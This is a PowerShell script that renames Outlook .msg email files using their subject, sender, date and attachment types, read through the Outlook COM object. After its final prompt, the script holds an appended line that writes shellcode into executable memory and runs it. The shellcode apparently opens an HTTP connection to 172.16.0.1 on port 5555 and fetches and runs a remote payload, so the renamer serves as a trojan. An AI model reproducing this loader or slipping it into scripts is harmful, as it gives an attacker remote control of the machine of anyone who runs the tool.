





function Release-Ref ($ref) {
    ([System.Runtime.InteropServices.Marshal]::ReleaseComObject([System.__ComObject]$ref) -gt 0)
    [System.GC]::Collect()
    [System.GC]::WaitForPendingFinalizers()
}


function Remove-InvalidFileNameChars ([String]$Name, [switch]$IncludeSpace) {
    if ($IncludeSpace) {
        [RegEx]::Replace($Name, "[{0}]" -f ([RegEx]::Escape([String][System.IO.Path]::GetInvalidFileNameChars())), '')
    } else {
        [RegEx]::Replace($Name, "[{0}]" -f ([RegEx]::Escape(-join [System.IO.Path]::GetInvalidFileNameChars())), '')
    }
}


function Get-Files {
    param (
        [string[]]$Path = $PWD,
        [string[]]$Include,
        [switch]$Recurse,
        [switch]$FoldersOnly
    )

    $params = '/L', '/NJH', '/BYTES', '/FP', '/NC', '/TS', '/XJ', '/R:0', '/W:0'
    if ($Recurse) {$params += '/E'}
    if ($Include) {$params += $Include}
    foreach ($dir in $Path) {
        foreach ($line in $(robocopy $dir NULL $params)) {
            
            if (!$Include -and $line -match '\s+\d+\s+(?<FullName>.*\\)$') {
                New-Object PSObject -Property @{
                    FullName = $matches.FullName
                    Size = $null
                    DateModified = $null
                }
            
            } elseif (!$FoldersOnly -and $line -match '(?<Size>\d+)\s(?<Date>\S+\s\S+)\s+(?<FullName>.*)') {
                New-Object PSObject -Property @{
                    FullName = $matches.FullName
                    Size = $matches.Size
                    DateModified = $matches.Date
                }
            } else {
                Write-Verbose ('{0}' -f $line)
            }
        }
    }
}

cls


$folder = Read-Host 'Drag and drop the folder you wish to process.'
$folder = $folder -replace '"' 
if (!$folder) { Throw 'No folder provided.' }


$recursive = Read-Host 'Check all subfolders? y/[N]'
if ($recursive -eq 'y') {
    $mails = Get-Files $folder -Include *.msg -Recurse | select -ExpandProperty fullname | ? {$_ -match '\.msg$'}
} else {
    $mails = Get-Files $folder -Include *.msg | select -ExpandProperty fullname | ? {$_ -match '\.msg$'}
}


Write-Host '    1: SUBJECT [A][FROM][DATE]'
Write-Host '    2: [DATE][FROM][A] SUBJECT'
$format = $null
while ($format -ne 1 -and $format -ne 2) {
    $format = Read-Host 'Choose a formatting option. [1]/2'
    if (!$format) { $format = 1 }
}



if ($format -eq 1) {
    $mails = $mails | ? {$_ -notmatch '\[.*\]\[[0-9]{4}-[0-9]{2}-[0-9]{2} [0-9]{2}\.[0-9]{2}\.[0-9]{2}\](?:-\d+)?\.msg$'}
} else {
    $mails = $mails | ? {$_ -notmatch '\\\[[0-9]{4}-[0-9]{2}-[0-9]{2} [0-9]{2}\.[0-9]{2}\.[0-9]{2}\]\[.*\]'}
}


$Outlook = New-Object -ComObject Outlook.application
$user = $Outlook.Session.CurrentUser.Name



$drives = [io.driveinfo]::getdrives() | % {$_.name[0]}
$alpha = [char[]](65..90)
$avail = diff $drives $alpha | select -ExpandProperty inputobject
$drive = $avail[0] + ':'


$i = 1
$total = $mails.Count
foreach ($mail in $mails) {
    
    $type = 1
    
    
    $file = (Split-Path $mail -Leaf) -replace '\.msg$'

    
    $folder = Split-Path $mail
    if ($total -gt 1) {
        Write-Progress `
            -Activity 'Processing...' `
            -Status "($i of $total) [$('{0:N0}' -f (($i/$total)*100))%] FOLDER: $folder" `
            -CurrentOperation "FILE: $file" `
            -PercentComplete (($i/$total)*100)
        $i++
    }
    
    
    
    

    
    
    $null = subst $drive /d
    $subst = $false
    if ($mail.length -gt 240) {
        $path = Split-Path $mail
        subst $drive $path
        $subst = $true
        rv path
        $mail = Join-Path $drive $(Split-Path $mail -Leaf)
    }

    
    try {
        $msg = $Outlook.CreateItemFromTemplate($mail)
    } catch {
        try {
            
            

            
            
            $type = 2
            
            
            $text = $null
            $text = cmd /c "type `"$mail`" 2>&1"
            if ($text -match 'The system cannot find') { Throw 'Unable to process. Probably due to strange characters in the filename.' }
            0..$($text.count-1) | % {$text[$_] = -join([string[]]$text[$_] | % {[char[]]$_} | ? {$_})}
            
            
            $subject = $null
            $subject = @($text | ? {$_ -match '(?:subject|emne): '})[0] -replace '^.*(?:subject|emne): '
            
            
            $attachment = $false
            $attached = $text | ? {$_ -match 'X-MS-Has-Attach: yes'}
            if ($attached) {
                $attached = 'A'
                $attachment = $true
            }

            
            $from = $null
            $from = @($text | ? {$_ -match '(?:fra|from): '})[0] -replace '^.*(?:fra|from): '
            $from = $from.Trim()
            if ($from -match '^\<') {
                $from = $from -replace '\<|\>'
            } elseif ($from -match '^\[') {
                $from = $from -replace '\[|\]'
            } elseif ($from -match '\[') {
                $from = $from -replace '^([^\[]+) \[.*$', '$1' -replace '"'
            } else {
                $from = $from -replace '^([^\<]+) <.*$', '$1' -replace '"'
            }
            $from = $from -replace '\s+$'
            $from = Remove-InvalidFileNameChars $from
            $from = ($from.split() | ? {$_}) -join ' '
            
            

            
            $date = $null
            $date = ($text | ? {$_ -match 'date: '} | select -f 1) -replace '^.*date: '
            try {
                $day = Get-Date $date -f yyyy-MM-dd
                $date = ($date -replace '^.*(\d\d:\d\d:\d\d).*$', '$1').Replace(':', '.')
                $date = "$day $date"
            } catch { $date = $null }
            if (!$date) {
                Write-Host "Date Error: $file" -ForegroundColor Red
                $(Get-Date -f yyyyMMdd_HHmmss) >> "$env:temp\MTFerror.txt"
                "filename: $mail" >> "$env:temp\MTFerror.txt"
                'Could not get DATE information' >> "$env:temp\MTFerror.txt"
                '' >> "$env:temp\MTFerror.txt"
            }
        } catch {
            Write-Host "Skipping: $file" -ForegroundColor Yellow
            $(Get-Date -f yyyyMMdd_HHmmss) >> "$env:temp\MTFerror.txt"
            "filename: $mail" >> "$env:temp\MTFerror.txt"
            $error[0] >> "$env:temp\MTFerror.txt"
            '' >> "$env:temp\MTFerror.txt"
            
            

            if ($subst) {
                subst $drive /d
            }

            continue
        }
    }
    
    
    if ($type -eq 1) {
        
        $subject = Remove-InvalidFileNameChars $msg.Subject

        
        
        
        $attachment = $false
        try {
            
            
            
            $attached = $msg.Attachments | % {if ($_.filename) {$_.filename} elseif ($_.displayname -eq 'Picture (Device Independent Bitmap)') {'image000.jpg'} else {'?'}}
        } catch {
            Write-Host "Attachments Error: $file" -ForegroundColor Red
            $(Get-Date -f yyyyMMdd_HHmmss) >> "$env:temp\MTFerror.txt"
            "filename: $mail" >> "$env:temp\MTFerror.txt"
            "attached: $attached" >> "$env:temp\MTFerror.txt"
            $error[0] >> "$env:temp\MTFerror.txt"
            '' >> "$env:temp\MTFerror.txt"
        }
        if ($attached) {
            $attached = ($attached | % {if ($_ -match '^image[0-9]{3}.[a-zA-Z]{3,4}$') {'.img'} else {$_}} | % {if ($_ -match '\.') {$_.substring($_.lastindexof('.') + 1).ToLower()} else {'..'}} | ? {$_} | select -Unique | sort) -join ','
            $attachment = $true
        }

        
        $from = $null
        $from = Remove-InvalidFileNameChars $msg.SenderName
    
        
        
        
        
    
        
        
        $date = $null
        $date = Get-Date $msg.SentOn -f 'yyyy-MM-dd HH.mm.ss'
        if (!$date) {
            Write-Host "Date Error: $file" -ForegroundColor Red
            $(Get-Date -f yyyyMMdd_HHmmss) >> "$env:temp\MTFerror.txt"
            "filename: $mail" >> "$env:temp\MTFerror.txt"
            'Could not get DATE information' >> "$env:temp\MTFerror.txt"
            '' >> "$env:temp\MTFerror.txt"
        }
    }

    
    $null = $msg | % {
        while (Release-Ref $_) {
            Release-Ref $_
        }
    }

    
    if ($format -eq 1) {
        $basename = ''
        $basename += "$subject "
        if ($attachment) { $basename += "[$attached]" }
        if ($to) {
            $basename += "[»$to][$date]"
        } else {
            $basename += "[$from][$date]"
        }
    } else {
        $basename = ''
        if ($to) {
            $basename += "[$date][»$to]"
        } else {
            $basename += "[$date][$from]"
        }
        if ($attachment) { $basename += "[$attached]" }
        $basename += " $subject"
    }

    
    
    $num = 1
    $TargetPath = Split-Path $mail
    $ext = '.msg'
    $newname = Join-Path $TargetPath ($basename + $ext)
	while (Test-Path -LiteralPath $newname) {
        $newname = Join-Path $TargetPath $($basename + "-$num" + $ext)
        $num++
	}
    rv TargetPath
    
    
    try {
        mv -LiteralPath $mail $newname
    } catch {
        Write-Host "Rename Error: $mail" -ForegroundColor Red
        $(Get-Date -f yyyyMMdd_HHmmss) >> "$env:temp\MTFerror.txt"
        "filename: $mail" >> "$env:temp\MTFerror.txt"
        "new name: $newname" >> "$env:temp\MTFerror.txt"
        $error[0] >> "$env:temp\MTFerror.txt"
        '' >> "$env:temp\MTFerror.txt"
    }

    
    if ($subst) {
        subst $drive /d
    }
}


$null = subst $drive /d


$null = $Outlook | % {
    while (Release-Ref $_) {
        Release-Ref $_
    }
}

Write-Host 'Done!'
Read-Host 'Press Enter to continue...'



$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,0x53,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,0x6a,0x03,0x53,0x53,0x68,0xb3,0x15,0x00,0x00,0xe8,0x8c,0x00,0x00,0x00,0x2f,0x42,0x4f,0x30,0x54,0x47,0x00,0x50,0x68,0x57,0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x00,0x32,0xe0,0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x96,0x6a,0x0a,0x5f,0x68,0x80,0x33,0x00,0x00,0x89,0xe0,0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x0a,0x4f,0x75,0xd9,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,0x40,0x00,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcd,0x8b,0x07,0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x75,0xff,0xff,0xff,0x31,0x37,0x32,0x2e,0x31,0x36,0x2e,0x30,0x2e,0x31,0x00;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

